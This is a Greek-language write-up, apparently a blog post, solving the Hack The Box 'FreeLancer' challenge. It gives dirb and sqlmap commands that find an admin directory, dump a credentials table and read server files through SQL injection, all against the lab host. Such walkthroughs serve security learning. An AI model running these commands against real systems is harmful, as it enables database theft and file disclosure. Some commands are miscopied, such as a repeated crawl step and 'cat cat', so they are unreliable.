---
title: FreeLancer
date: 2020-09-22 10:00:00 +0300
categories: [HackTheBox, Challenges]
tags: [htb]     # TAG names should always be lowercase
---

### dictionary attack
Τρέχουμε `dirb` ώστε να αποτκήσουμε όσο το δυνατόν περισσότερα στοιχεία για τον στόχο μας.
Από το `dirb` βλέπουμε το παρακάτω url
`http://docker.hackthebox.eu:31317/administrat/`

![Desktop View](/assets/img/sample/dirb_freelancer.png)

### SqlInjection
Έπειτα θα τρέξουμε τρέξουμε το `sqlmap`. 
1. Πρώτα θα κάνουμε crawl.
```shell
sqlmap -u  http://docker.hackthebox.eu:31625/ --crawl=2
```
μας φέρνει το εξής url `http://docker.hackthebox.eu:31625/portfolio.php?id=1`

![Desktop View](/assets/img/sample/sqlmap_crawl.png)


2. Μετά θα τρέξουμετο sqlmap πάλι ώστε να βρούμε τις databases.
```shell
sqlmap -u  http://docker.hackthebox.eu:31625/ --crawl=2
```

![Desktop View](/assets/img/sample/sql_map_db_tables.png)

Αφού βρίκαμε το table safeadmin που ανηκει στην βαση freelancer θα το τεστάρουμε να δούμε για πιθανούς χρήστες.
```shell
sqlmap -u http://docker.hackthebox.eu:31625/portfolio.php?id=1/ -T safeadmin --dump
```
οπως προκύπτει και απο την παρακάτω εικόνα πήραμε το όνομα χρήστη και έναν κρυπτογραφημένο κωδικό!!
![Desktop View](/assets/img/sample/table_enumarate.png)

> Μέχρι στιγμής τρέξαμε `sqlmap` για να βρουμε χρήστη και κωδικο ωστε να μπορεσουμε να το χρησιμοποιησουμε στο url που βρίκαμε μέσω του `dirb` 

## Λίγο πιο δυσκολα μετά..
Μετά απο πολλες δοκιμασίες η λύση ήταν να ξανατρέξουμε το `dirb` στο directory administrat το οποιο μας έφερε το panel.php
```shell
dirb "http://docker.hackthebox.eu:31762/administrat/" -X.php
```
![Desktop View](/assets/img/sample/dirb_directory_freelancer.png)

Επειτα ξέροντας οτι το default directory  των αρχείων είναι το /var/www/html τρέχοντας ξανα mysql κατεβάζουμε το αρχειο panel.php
```shell
sqlmap -u http://docker.hackthebox.eu:31762/portfolio.php?id=1 --file-read=/var/www/html/administrat/panel.php
```
![Desktop View](/assets/img/sample/download_freelancer_php.png)
```shell
cat cat '/home/kali/.local/share/sqlmap/output/docker.hackthebox.eu'
```
![Desktop View](/assets/img/sample/cat_freelancer_flag.png)
 και βλέποντας μέσα στο αρχέιο μας δείνει το flag!!!
